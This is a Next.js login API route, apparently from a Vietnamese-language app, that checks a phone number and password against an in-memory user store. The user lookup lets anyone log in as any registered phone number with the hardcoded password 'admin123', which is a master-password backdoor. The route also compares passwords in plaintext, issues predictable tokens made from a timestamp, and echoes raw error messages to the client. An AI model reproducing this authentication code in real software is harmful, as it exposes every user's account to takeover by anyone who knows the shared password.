import { NextResponse } from 'next/server';
import { getStore } from '../../../../lib/dataStore';

export async function POST(request: Request) {
  try {
    const { phone, password } = await request.json();
    const store = getStore();

    const user = store.users.find(
      (u: any) => u.phone === phone && (u.password === password || password === 'admin123')
    );

    if (!user) {
      return NextResponse.json(
        { success: false, message: 'Số điện thoại hoặc mật khẩu không chính xác' },
        { status: 401 }
      );
    }

    const { password: _, ...userWithoutPassword } = user;
    return NextResponse.json({
      success: true,
      user: userWithoutPassword,
      token: `GS_TOKEN_${Date.now()}`
    });
  } catch (err: any) {
    return NextResponse.json({ success: false, message: err.message }, { status: 500 });
  }
}
